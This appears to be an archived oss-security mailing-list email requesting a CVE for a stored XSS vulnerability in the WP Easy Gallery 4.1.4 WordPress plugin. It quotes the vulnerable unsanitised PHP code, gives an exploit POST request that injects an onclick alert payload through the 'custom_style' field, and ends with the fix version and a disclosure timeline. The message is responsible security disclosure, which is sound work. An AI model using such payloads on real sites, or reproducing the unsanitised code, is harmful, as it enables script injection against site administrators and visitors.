X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1952" "Tuesday" "26" "January" "2016" "15:29:35" "+0530" "Rahul Pratap Singh" "techno.rps@gmail.com" "<CADLX=aHvwog3Ss3sVQVhoi-F1A46a2X+w687MCJ+q-5Z_kBUSA@mail.gmail.com>" "63" "[oss-security] CVE Request: WP Easy Gallery v4.1.4 Stored XSS Vulnerability" nil nil nil "1" "2016012609:59:35" "[oss-security] CVE Request: WP Easy Gallery v4.1.4 Stored XSS Vulnerability" (number mark "U       techno.rps@g Jan 26   63/1952  " thread-indent "\"[oss-security] CVE Request: WP Easy Gallery v4.1.4 Stored XSS Vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 13735 invoked by uid 550); 26 Jan 2016 10:15:48 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 6030 invoked from network); 26 Jan 2016 09:59:47 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to:content-type;
        bh=BXAwYoBZBPF7+njxY1UGrlD/RQ9Wif0E45giNoZ4zBM=;
        b=li+xKGMgXS62APGaTz9nq3G1Z+WUjr8It0fI8Uu/dUhhCSRqkmzqxm8+QWOaLeJrKF
         AR1JX8ItZ7I2g5J6F9TyxR+XFFyOfsRKl/qsqCd1Lez+DSzUjSJ+h2m0cgmj2nXMzMc+
         Za7Xi8CF8PemOy321BDnxLslBjEOBiVnmxShpRoV5URyqZS7Xg/AdZC5S9JePBTRERd/
         Tui981T4mLvwN9EYpSj1NdpVAmQOpi7TjiXLaomLOop9S2XOp88WCtFJCaavMszoBP9D
         vV8BeveQFndVnR7j8qFTzDbWUa6BGtYOeOskHhSXXZ3hocXj3KXpJG+sJ0FrmnAtMI07
         2d9Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:date:message-id:subject:from:to
         :content-type;
        bh=BXAwYoBZBPF7+njxY1UGrlD/RQ9Wif0E45giNoZ4zBM=;
        b=IVbGHhkQxrNYUUDCBStmC9gnP9X9LjKzSfvJ7aTzsRpiVWrdvqKgWyKLHh6qGcUVX1
         7SAsoQYWOmdpVqtMvAEavgr5Kfy1Lj/yy3MPMAkl9bw/b2NUyRyHEP4GsyBdMHtzn9i7
         g/GvzTJhRK28EnAJZoyN0F7oxSXbGKF2W+Hn1ulJQ96XbxPb7MpJW9rOY2hYtAqXsg1F
         VoPxei7eKGYwVvzx5E39WBvV+a9d3VjRluxyrqagIQSyh8ZocxdUhBCUIfHJaIO6fice
         jPCILSkYl05VLA9JigmB45a8rpwqTJzsK+j1uOb1ttdy0M9UYXlNn8LvJE894ppGmVq1
         Kr4Q==
X-Gm-Message-State: AG10YOS7l1wz5ChQ143NimMWUqQh2orYVinXLjVW5VIV4aWyFNN83BBoyag7VB68bdmA3sdeKRwWLCpKkk58SA==
MIME-Version: 1.0
X-Received: by 10.107.35.16 with SMTP id j16mr21158334ioj.10.1453802375071;
 Tue, 26 Jan 2016 01:59:35 -0800 (PST)
Date: Tue, 26 Jan 2016 15:29:35 +0530
Message-ID: <CADLX=aHvwog3Ss3sVQVhoi-F1A46a2X+w687MCJ+q-5Z_kBUSA@mail.gmail.com>
From: Rahul Pratap Singh <techno.rps@gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=001a11405fc023ce48052a39be96
Subject: [oss-security] CVE Request: WP Easy Gallery v4.1.4 Stored XSS Vulnerability

--001a11405fc023ce48052a39be96
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

#Product    : WP Easy Gallery
#Version    : 4.1.4
#Home page Link  : https://wordpress.org/plugins/wp-easy-gallery

XSS Vulnerability:

----------------------------------------
Description:
----------------------------------------
"custom_style" parameter is not sanitized that leads to Stored XSS.

----------------------------------------
Vulnerable Code:
----------------------------------------
File Name: wpeg-settings.php

Found at line:12
$temp_defaults['custom_style'] =3D isset($_POST['custom_style']) ?
$_POST['custom_style'] : '';

Found at line:103
<td><textarea name=3D"custom_style" id=3D"custom_style" rows=3D"4"
cols=3D"40"><?php _e($default_options['custom_style']); ?></textarea></td>

----------------------------------------
Exploit:
----------------------------------------
POST /wp-admin/admin.php?page=3Dwpeg-settings

wpeg_settings=3D3b59e6c6ef&_wp_http_referer=3Dabc&display_mode=3Dabc&num_co=
lumns=3Dabc&show_gallery_name=3Dabc&gallery_name_alignment=3Dabc&use_defaul=
t_style=3Dabc&drop_shadow=3Dabc&custom_style=3D</textarea><input+type%3Dtex=
t+onclick%3Dalert(%2FXSS%2F)><!--&defaultSettings=3Dxss&Submit=3DSave

----------------------------------------
POC:
----------------------------------------
https://0x62626262.files.wordpress.com/2016/01/easy-gallery-settingsxsspoc.=
png

Fix:
Update to 4.1.5

Disclosure Timeline:
reported to wordpress  : 18/1/2016
wordpress response (plugin taken down) : 19/1/2016
vendor deployed a patch : 26/1/2016

#######################################
#        CTG SECURITY SOLUTIONS     #
#        www.ctgsecuritysolutions.com    #
#######################################

Pub ref:
https://0x62626262.wordpress.com/2016/01/26/wp-easy-gallery-v4-1-4-stored-x=
ss-vulnerability/
https://wordpress.org/plugins/wp-easy-gallery/changelog/

--001a11405fc023ce48052a39be96--
